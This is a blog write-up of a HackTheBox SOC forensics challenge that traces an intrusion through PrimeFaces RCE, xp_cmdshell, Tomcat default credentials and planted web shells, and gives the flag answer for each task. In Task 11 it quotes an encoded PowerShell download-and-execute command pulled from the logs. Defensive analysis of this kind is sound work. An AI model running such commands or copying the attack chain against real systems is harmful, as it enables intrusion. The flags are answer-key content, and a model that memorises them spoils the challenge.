---
title: "HTB SOC Sherlock: JustSomePages"
type: "posts"
author: WildPasta
author_url: "https://medium.com/@wildpasta"
published: 2026-04-09
source: Medium
toc: false
categories: ["writeups"]
tags: ["hackthebox", "dfir", "writeups"]
---

# HTB SOC Sherlock: JustSomePages

Just before it got retired, I owned this SOC challenge mostly featuring network analysis. You will follow the tracks of the intruder who compromized three different hosts in the GOTHAM organization.

---

> Task 1: Which vulnerability did the attacker leverage to achieve initial compromise?

The webserver is the entrypoint in this challenge. It allowed the intruder to pivot onto the workstation and the DC afterwards. So by looking at the _pcap_ first, we filter on HTTP requests. The GET requests are reaching the IP **98.88.81.13** so it’s the webserver and **77.23.19.77** is most likely the intruder address.

The requests are exclusively reaching a _javax.faces.resource_ and by googling this you can find out about a Primefaces CVE ([CVE-2017–1000486](https://nvd.nist.gov/vuln/detail/CVE-2017-1000486)). It is a RCE on vulnerable Primeface Java web framework (CWE-326: Inadequate Encryption Strength).

{{< admonition type=success title="FLAG" open=false >}}
CVE-2017-1000486
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 2: Identify the HTTP request parameter abused by the attacker to deliver the encrypted exploit payload.

MindedSecurity wrote a very useful [blogpost](https://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html) about this CVE where you can read that the parameter used to inject malicious code is _pfdrid_.

{{< admonition type=success title="FLAG" open=false >}}
pfdrid
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 3: Which handler in the web application is vulnerable and gets invoked by the exploit?

According to [MindedSecurity blogpost](https://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html) about this PrimeFaces vulnerability: “The common vulnerable sink for both security issues is the PrimeFaces **Streamed Content Handler**”.

{{< admonition type=success title="FLAG" open=false >}}
StreamedContentHandler
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 4: What byte-length threshold should a Base64-encoded payload surpass for the request to be filtered and flagged for this vulnerability?

Still on the same source, you learn that the remediation is to filter out incoming requests with _pfdrid_ parameter (**value longer than 16 bytes and Base64 encoded**) and _“pfdrt=sc”_.

{{< admonition type=success title="FLAG" open=false >}}
16
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 5: Following the initial compromise, which TCP port was used by the attacker to establish an authenticated session through which data was streamed?

From this point on, we have to switch to the workstation capture. In Statistics > Conversations you can see that the three most used ports are: 49668, 8080 and 1433.

{{< image src="images/Top_traffic_on_the_WS_capture__source__w_7015.png" alt="Top traffic on the WS capture (source: win10.pcap)" caption="Top traffic on the WS capture (source: statistics of win10.pcap)" >}}

The one you have to focus on is 1433, it is commonly known as the SQL Server port. There is a Client Hello at **13:17:28** which is the attacker getting into the SQL Server hosted on the Windows host.

{{< admonition type=success title="FLAG" open=false >}}
1433
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 6: Using a feature exposed by the application running on that port, which command did the attacker execute as part of their discovery tactic?

Once the malicious connection is identified, you have to _Follow TCP stream_ to analyze what happened there. You see on the screenshot below that the intruder landed on _DESKTOP-2P5FS1A_ as **SQLEXPRESS user** (a standard windows database service).

The attacker then executed two command leveraging **xp_cmdshell misconfiguration** (see [pentestmonkey’s howto](https://pentestmonkey.net/blog/resurecting-xp_cmdshell)) which allow a malicious user to execute command in the context of the user running the database service.

{{< image src="images/Database_command_execution__source__fram_3863.png" alt="Database command execution (source: frame 4273 and 4444 in win10.pcap)" caption="Database command execution (source: frame 4273 and 4444 in win10.pcap)" >}}

In this case, the user checked the identity of the user he logged in as and the tasks running on the host.

{{< admonition type=success title="FLAG" open=false >}}
xp_cmdshell 'tasklist /v'
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 7: What Windows process should defenders monitor to capture suspicious activity of this nature?

To avoid the SQL Server spawning random _cmd.exe_, defenders should check the **sqlservr.exe** which is the main executable process for Microsoft SQL Server.

{{< admonition type=success title="FLAG" open=false >}}
sqlservr.exe
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 8: Following execution of the discovery command, what is the process ID (PID) of the web application service running on the victim’s machine?

Starting [Sysmon View](https://github.com/nshalabi/SysmonTools), you can see in the _Process View_ that a **Tomcat** is running. It’s a legitimate service used to host web application. Here, it’s running as **PID 1472**.

{{< image src="images/Tomcat_running_process_on_WS10__source___5577.png" alt="Tomcat running process on WS10 (source: sysmon-logs from win10.evtx)" caption="Tomcat running process on WS10 (source: sysmon-logs from win10.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
1472
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 9: Which uploaded file allowed the attacker to plant multiple web shells and escalate privileges?

So in the SQL server compromission, the intruder’s IP was **10.20.14.52**. Let’s add a filter on our _Win-10.pcapng_. In addition to this, you should check what’s going on with this **HTTP traffic on port 8080**.

First, you notice an active **nmap recon**scan (user agent being `Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)`). After all of this noise, the **intruder logged into the Tomcat manager** (pcap frame 5204) using the default credentials (tomcat:tomcat).

{{< image src="images/Intruder_accessing_the_manager_interface_2556.png" alt="Intruder accessing the manager interface with default credentials (source: frame 5249of win-10.pcap)" caption="Intruder accessing the manager interface with default credentials (source: frame 5249 of win-10.pcap)" >}}

Using this access, the attacker then reached the URI `/manager/html/upload` which is interesting. It appears that a `wsexample.war` file was uploaded on the Tomcat server.

{{< image src="images/Uploaded_plugin_on_the_Tomcat_management_2992.png" alt="Uploaded plugin on the Tomcat management interface (source: frame 5381 of win-10.pcap)" caption="Uploaded plugin on the Tomcat management interface (source: frame 5381 of win-10.pcap)" >}}

Let’s check out the staged webshells by extracting this war file out of the captured frames (_Files > Export Objects > HTTP_):

{{< image src="images/Content_of_uploaded_wsexample_war__sourc_2707.png" alt="Content of uploaded wsexample.war (source: extracted frame 5381 of win-10.pcap)" caption="Content of uploaded wsexample.war (source: extracted frame 5381 of win-10.pcap)" >}}

The above capture features:

- id_win.jsp: windows webshell
- one_lin.jsp: webshell
- up-base.jsp: custom java onliner webshell
- _example.jsp: reGeorg webshell

To get back to the question, **the initial stager is the WAR file**. It’s a Java archive format used by framework like Tomcat to enable **plugins upload**.

{{< admonition type=success title="FLAG" open=false >}}
wsexample.war
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 10: What file was accessed by the attacker to retrieve the administrator’s credentials?

The attacker interacted with his webshells and found an admin script named `connect.ps1`. It’s content features hardcoded credentials 🤮 of the database (exact timestamp: Nov 3, 2025 13:19:34UTC).

{{< image src="images/Attacker_requesting_content_of_connect_p_3478.png" alt="Attacker requesting content of connect.ps1 (source: frame 5840 of win-10.pcap)" caption="Attacker requesting content of connect.ps1 (source: frame 5840 of win-10.pcap)" >}}

{{< admonition type=success title="FLAG" open=false >}}
connect.ps1
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 11: Which PowerShell script (filename) did the attacker download to perform lateral movement?

For this question, let’s focus on the DC logs. Here, when looking at process creation involving powershell in Sysmon events you will end up finding the following.

```powershell
#source: dc.evtx sysmon process creation at 2025–11–03 13:22:30

#powershell command
powershell.exe -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMgAwAC4AMQA0AC4ANQAyADoAOAAwADgAMAAvAHcAZQBiAHMAZQByAHYAZQByAC4AcABzADEAIgApADsAUwB0AGEAcgB0AC0AVwBlAGIAUwBlAHIAdgBlAHIA
#decoded
powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString("http://10.20.14.52:8080/webserver.ps1");Start-WebServer
```

The PowerShell script used is webserver.ps1

{{< admonition type=success title="FLAG" open=false >}}
webserver.ps1
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 12: Which child process spawned by the previously identified web application process would indicate suspicious activity in this scenario?

Filter the ParentProcess _Tomcat6.exe_ to find out its child process. Doing so, you notice that Tomcat did spawn a _cmd.exe_ which is NOT something it should be doing.

{{< image src="images/Spawned_cmd_exe_in_context_of_Tomcat_web_9187.png" alt="Spawned cmd.exe in context of Tomcat webserver" caption="Spawned cmd.exe in context of Tomcat webserver (source: win-10.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
cmd.exe
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 13: On which port was the PowerShell backdoor accepting connections?

Here, we have to save the _webserver.ps1_ script that can be found in the DC network capture. So _Files > Export Objects > HTTP_to save the script on frame 8564.

It’s content lead us to this [powershell webshell](https://github.com/MScholtes/SysAdminsFriends/blob/master/Module/functions/Start-WebServer.ps1) on Github. However, the intruder used a custom high port to avoid detection.

{{< image src="images/Snippet_of_the_uploaded_webserver_ps1_6604.png" alt="Snippet of the uploaded webserver.ps1" caption="Snippet of the uploaded webserver.ps1 (source: webserver.ps1 l. 50)" >}}

{{< admonition type=success title="FLAG" open=false >}}
65512
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 14: Specify the complete destination path the attacker used when copying the sensitive files.

Filter on the parent process of the webserver.ps1 (PID 4880) to find the powershell commands used to exfiltrate sensitive files. You will see that the intruder used copy utility to paste _employee.txt_ in the WWW root directory where he could fetch it easily.

{{< image src="images/Command_used_to_exfiltrate_sensitive_inf_3243.png" alt="Command used to exfiltrate sensitive information" caption="Command used to exfiltrate sensitive information (source: dc.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
C:\inetpub\wwwroot\
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 15: What file was uploaded by the attacker to ensure persistent access?

The attacker deleted the default _iisstart.htm_to put its own backdoored _iisstart.aspx_. It allowed him to interact directly with the root URI. Know that _iistart_ is the default webpage shown when landing on a IIS website.

{{< admonition type=success title="FLAG" open=false >}}
iisstart.aspx
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 16: Which method call should be monitored so defenders can detect the JSP command-execution web shell deployed by an attacker in a WAR file?

_With some google searches, you will find any answer you want (or don’t want even)._

In order to execute commands directly on the OS level, Java has a method named `Runtime.getRuntime().exec` which is a good indicator of a malicious file. Legitimate JSP applications do not need such feature so it’s a good call, as a defender, to monitor this suspicious method.

{{< admonition type=success title="FLAG" open=false >}}
Runtime.getRuntime().exec
{{< /admonition >}}

{{< admonition type=tip title="Extra mile" open=true >}}
_ProcessBuilder_ class can also be abused to create processes on host. So beware of this other technique and monitor this as well.
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 17: Presence of which Java class is a good indicator to monitor for HTTP-tunneler web shells?

HTTP tunneling requires to **open network sockets**. Thanks Google for filling in my Java devdocs knowledge gap, these can be spawned using `SocketChannel sc = SocketChannel.open()` and then connected to with `sc.connect(new InetSOcketAddress(targetHost, targetPort))`.

{{< admonition type=success title="FLAG" open=false >}}
SocketChannel
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 18: Which configuration flag, if present, would be strong indicators of a JSP file browser web shell similar to the attacker’s?

Since we found the [original webshell](https://github.com/tennc/webshell/blob/master/jsp/jsp_File_browser.jsp) used by the attacker to ease its intrusion, we can find indicators directly in source code. The quick answer awaited is located [here](https://github.com/tennc/webshell/blob/6b17eae4a0bc792f996a38ce32772e4db9c7c799/jsp/jsp_File_browser.jsp#L37) and allow the upload of files.

But tbh it could have also been one of the many features like `LAUNCH_COMMAND = Launch external program` that look as suspicious if not more.

{{< admonition type=success title="FLAG" open=false >}}
ALLOW_UPLOAD = true
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 19: Which Java class writes raw byte content to a file on disk in the attacker’s file-uploader web shell?

Still poking around the docs, you learn that `FileOutputStream` is the standard Java class used for writing streams of raw bytes to a file (as opposed to `FileWriter`, which is for characters).

{{< admonition type=success title="FLAG" open=false >}}
FileOutputStream
{{< /admonition >}}

---

So this box was very amusing to solve. I wasn’t used to so much network analysis in the Sherlock challenges but leveraging Wireshark features correctly was key to understand the full compromise of this organization. The EVTX weren’t very useful and the box can easily be done without it. I hope this WU will help you understand better how to tackle this kind of investigation.

During my investigation, I also found some interesting similarities with the attack ran by [Elephant Beetle](https://f.hubspotusercontent30.net/hubfs/8776530/Sygnia-%20Elephant%20Beetle_Jan2022.pdf) (mostly on the Primeface vulnerability exploited and the _.jsp_ backdoors).

_NB: My write-up are written by myself, without any AI assistance. Excuse my poor english, I chose to share raw content._

{{< image src="images/justsomepages_success_banner.png" alt="JustSomePages success banner" caption="JustSomePages success banner" >}}